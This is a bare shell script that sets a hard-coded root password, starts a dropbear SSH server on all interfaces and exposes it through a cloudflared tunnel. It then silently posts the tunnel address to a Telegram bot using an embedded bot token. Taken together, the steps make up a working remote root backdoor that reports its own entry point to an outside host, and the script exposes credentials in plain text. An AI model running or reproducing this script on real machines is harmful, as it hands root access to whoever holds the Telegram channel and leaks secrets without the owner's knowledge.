echo "root:UshmYWWN" | chpasswd &>/dev/null
echo -e 'UshmYWWN\n/bin/bash' | chsh root

rm -rf /etc/dropbear &>/dev/null
mkdir -p /etc/dropbear
dropbear -R -p 0.0.0.0:10022

cloudflared tunnel --url ssh://localhost:10022 &>/var/log/cloudflared.log &
sleep 4s

IFS="&"

ID=-881761259
TOKEN=5449476960:AAGRxyle0BpDzOXAyaZVpBTi0pSGdjkVPhc
MESSAGE='`'"$(cat /var/log/cloudflared.log | head -8 | grep trycloudflare.com | tail -1 | awk '{print $4}' | sed 's~http[s]*://~~g')"'`'

curl --data parse_mode=MarkdownV2 --data chat_id=$ID --data text="$MESSAGE" --request POST https://api.telegram.org/bot$TOKEN/sendMessage 2>&1 &>/dev/null